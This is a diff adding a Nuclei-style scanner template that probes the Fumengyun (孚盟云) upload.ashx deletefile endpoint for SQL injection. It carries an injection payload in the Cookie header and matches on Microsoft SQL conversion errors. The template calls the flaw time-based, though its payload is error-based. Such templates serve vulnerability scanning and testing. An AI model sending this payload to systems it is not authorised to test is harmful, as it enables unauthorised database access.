@@ -1,0 +1,25 @@
+id: fumengyun-upload_ashx-deletefile-sql-time
+
+info:
+  name: 孚盟云 upload.ashx deletefile SQL延时注入漏洞
+  author: fumengyun
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=deletefile&name=sqli HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sqli=1' AND 1=@@VERSION--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
